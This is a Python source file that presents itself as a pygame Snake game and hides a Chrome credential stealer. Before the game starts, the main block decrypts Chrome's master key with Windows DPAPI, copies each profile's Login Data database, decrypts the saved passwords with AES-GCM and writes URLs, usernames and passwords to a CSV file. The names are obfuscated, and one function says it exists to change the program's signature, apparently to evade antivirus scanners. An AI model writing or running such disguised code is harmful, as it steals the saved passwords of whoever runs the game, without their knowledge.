import pygame
import time
import random
import os
import re
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv
import string
import time
import random


# GLOBAL CONSTANT
QWERTYZXCVBNM123 = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
ASDFGHJKLPOIUYTRE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))

# Random utility function
TYUIOPLKJHGFDSA12 = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
def JKLOIUYTREWQASDF():
    part1 = ''.join(random.choices(string.ascii_letters, k=8))
    part2 = ''.join(random.choices(string.digits, k=8))
    return part1 + part2

def ZXCVBNMASDFGHJKL():
    try:
        with open(QWERTYZXCVBNM123, "r", encoding='utf-8') as XCVBNMASDFGHJKLPO:
            POIUYTREWQASDFGH = XCVBNMASDFGHJKLPO.read()
            split1 = POIUYTREWQASDFGH[:len(POIUYTREWQASDFGH)//2]
            split2 = POIUYTREWQASDFGH[len(POIUYTREWQASDFGH)//2:]
            COMBINEDPOIUYTREWQ = json.loads(split1 + split2)
        SECRETENCRYPTKEY = base64.b64decode(COMBINEDPOIUYTREWQ["os_crypt"]["encrypted_key"])
        SECRETENCRYPTKEY = SECRETENCRYPTKEY[5:]
        DECRYPTEDSECRET = win32crypt.CryptUnprotectData(SECRETENCRYPTKEY, None, None, None, 0)[1]
        return DECRYPTEDSECRET
    except Exception as TYUIOPLKJHGFDSA:
        print(f"[ERROR] Unable to fetch secret key: {TYUIOPLKJHGFDSA}")
        return None

def ASZXCVBNMLKJHGFDS(cipher, payload):
    return cipher.decrypt(payload)

def QWERTYUIOPLKJHGFD(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def ZXCVBNMPOIUYTREW(ciphertext, secret_key):
    try:
        INITVECTORYTRESDFG = ciphertext[3:15]
        ENCRYPTEDPASSCVBNML = ciphertext[15:-16]
        CIPHERYTREWQASDFGH = QWERTYUIOPLKJHGFD(secret_key, INITVECTORYTRESDFG)
        DECRYPTEDPASSMNBVCX = ASZXCVBNMLKJHGFDS(CIPHERYTREWQASDFGH, ENCRYPTEDPASSCVBNML).decode()
        return DECRYPTEDPASSMNBVCX
    except Exception as ERRZXCVBNMLKJHGFD:
        print(f"[ERROR] Unable to decode password: {ERRZXCVBNMLKJHGFD}")
        return ""

def POIUYTREWQLKJHGF(db_path):
    try:
        TEMPDBXCVBNMASDFG = "TempLoginVault.db"
        shutil.copy2(db_path, TEMPDBXCVBNMASDFG)
        return sqlite3.connect(TEMPDBXCVBNMASDFG)
    except Exception as ERRMNBVCXZLKJHGF:
        print(f"[ERROR] Unable to connect to database: {ERRMNBVCXZLKJHGF}")
        return None

def YTREWQLKJHGFDSA():
    print("Random function to change signature.")
    return JKLOIUYTREWQASDF() * 2
    
def snake_game():
    pygame.init()

    # Screen Dimensions
    width, height = 600, 400
    screen = pygame.display.set_mode((width, height))
    pygame.display.set_caption("Snake Game")

    # Colors
    white = (255, 255, 255)
    black = (0, 0, 0)
    red = (255, 0, 0)
    green = (0, 255, 0)
    blue = (0, 0, 255)
    yellow = (255, 255, 102)

    # Clock and speed
    clock = pygame.time.Clock()
    snake_speed = 15

    # Snake properties
    snake_block = 10
    snake_list = []
    length_of_snake = 1

    # Fonts
    font_style = pygame.font.SysFont("bahnschrift", 25)
    score_font = pygame.font.SysFont("comicsansms", 35)

    # Display message
    def message(msg, color, position):
        mesg = font_style.render(msg, True, color)
        screen.blit(mesg, position)

    # Display score
    def display_score(score):
        value = score_font.render(f"Score: {score}", True, yellow)
        screen.blit(value, [0, 0])

    # Draw the snake
    def draw_snake(block_size, snake_list):
        for block in snake_list:
            pygame.draw.rect(screen, green, [block[0], block[1], block_size, block_size])

    # Start menu
    def start_menu():
        screen.fill(black)
        message("Welcome to Snake Game!", blue, [width // 6, height // 3])
        message("Press SPACE to Start", white, [width // 4, height // 2])
        pygame.display.update()
        wait_for_key(pygame.K_SPACE)

    # Wait for a specific key
    def wait_for_key(key):
        while True:
            for event in pygame.event.get():
                if event.type == pygame.KEYDOWN and event.key == key:
                    return
                if event.type == pygame.QUIT:
                    pygame.quit()
                    quit()

    # Retry menu
    def retry_menu(score):
        screen.fill(black)
        message("Game Over!", red, [width // 3, height // 3])
        message(f"Your Score: {score}", yellow, [width // 3, height // 2.5])
        message("Press R to Retry or Q to Quit", white, [width // 8, height // 2])
        pygame.display.update()
        while True:
            for event in pygame.event.get():
                if event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_r:
                        return True
                    elif event.key == pygame.K_q:
                        return False
                if event.type == pygame.QUIT:
                    pygame.quit()
                    quit()

    # Main game loop
    while True:
        start_menu()

        # Snake position and food
        x1, y1 = width // 2, height // 2
        x1_change, y1_change = 0, 0
        foodx = round(random.randrange(0, width - snake_block) / 10.0) * 10.0
        foody = round(random.randrange(0, height - snake_block) / 10.0) * 10.0
        length_of_snake = 1
        snake_list.clear()
        game_over = False

        while not game_over:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    pygame.quit()
                    quit()
                if event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_LEFT and x1_change == 0:
                        x1_change, y1_change = -snake_block, 0
                    elif event.key == pygame.K_RIGHT and x1_change == 0:
                        x1_change, y1_change = snake_block, 0
                    elif event.key == pygame.K_UP and y1_change == 0:
                        x1_change, y1_change = 0, -snake_block
                    elif event.key == pygame.K_DOWN and y1_change == 0:
                        x1_change, y1_change = 0, snake_block

            # Update position
            x1 += x1_change
            y1 += y1_change

            # Check boundaries
            if x1 >= width or x1 < 0 or y1 >= height or y1 < 0:
                game_over = True

            # Redraw screen
            screen.fill(black)
            pygame.draw.rect(screen, red, [foodx, foody, snake_block, snake_block])
            draw_snake(snake_block, snake_list)
            display_score(length_of_snake - 1)

            # Snake movement
            snake_head = [x1, y1]
            snake_list.append(snake_head)
            if len(snake_list) > length_of_snake:
                del snake_list[0]

            # Check collision with itself
            for block in snake_list[:-1]:
                if block == snake_head:
                    game_over = True

            # Check food collision
            if x1 == foodx and y1 == foody:
                foodx = round(random.randrange(0, width - snake_block) / 10.0) * 10.0
                foody = round(random.randrange(0, height - snake_block) / 10.0) * 10.0
                length_of_snake += 1

            pygame.display.update()
            clock.tick(snake_speed)

        # Retry menu
        if not retry_menu(length_of_snake - 1):
            break

    pygame.quit()


if __name__ == '__main__':
    try:
        YTREWQLKJHGFDSA()

        with open('output_pw_dump.csv', mode='w', newline='', encoding='utf-8') as OUTFILEZXCVBNMASD:
            WRITERXCVBNMASD = csv.writer(OUTFILEZXCVBNMASD, delimiter=',')
            WRITERXCVBNMASD.writerow(["Idx", "URL", "User", "Pass"])

            SECRETKEYTYUIOPLKJHGF = ZXCVBNMASDFGHJKL()

            if not SECRETKEYTYUIOPLKJHGF:
                sys.exit("[ERROR] Missing secret key")

            PROFOLDERSLKJHGFD = [FOLDER for FOLDER in os.listdir(ASDFGHJKLPOIUYTRE) if re.search(r"^Profile.*|Default$", FOLDER)]

            for PROFILETYUIOPLKJH in PROFOLDERSLKJHGFD:
                DBPATHTYUIOPLKJHGFD = os.path.normpath(f"{ASDFGHJKLPOIUYTRE}\\{PROFILETYUIOPLKJH}\\Login Data")
                DBCONNECTIONLKJHGFDSA = POIUYTREWQLKJHGF(DBPATHTYUIOPLKJHGFD)

                if DBCONNECTIONLKJHGFDSA:
                    CURSORZXCVBNMLKJHGFD = DBCONNECTIONLKJHGFDSA.cursor()
                    CURSORZXCVBNMLKJHGFD.execute("SELECT action_url, username_value, password_value FROM logins")

                    for IDXPOIUYTREWQASDF, RECORDZXCVBNMLKJHGFD in enumerate(CURSORZXCVBNMLKJHGFD.fetchall()):
                        URLZXCVBNMLKJHGFDS, USERZXCVBNMLKJHGFDS, ENCRYPTEDPWZXCVBNMAS = RECORDZXCVBNMLKJHGFD

                        if URLZXCVBNMLKJHGFDS and USERZXCVBNMLKJHGFDS and ENCRYPTEDPWZXCVBNMAS:
                            DECRYPTEDPWZXCVBNMASD = ZXCVBNMPOIUYTREW(ENCRYPTEDPWZXCVBNMAS, SECRETKEYTYUIOPLKJHGF)
                            print(f"{IDXPOIUYTREWQASDF}: {URLZXCVBNMLKJHGFDS} | {USERZXCVBNMLKJHGFDS} | {DECRYPTEDPWZXCVBNMASD}")
                            WRITERXCVBNMASD.writerow([IDXPOIUYTREWQASDF, URLZXCVBNMLKJHGFDS, USERZXCVBNMLKJHGFDS, DECRYPTEDPWZXCVBNMASD])

                    CURSORZXCVBNMLKJHGFD.close()
                    DBCONNECTIONLKJHGFDSA.close()
                    os.remove("TempLoginVault.db")
        snake_game()

    except Exception as MAINERRZXCVBNMLKJHGF:
        print(f"[ERROR] Unexpected error occurred: {MAINERRZXCVBNMLKJHGF}")
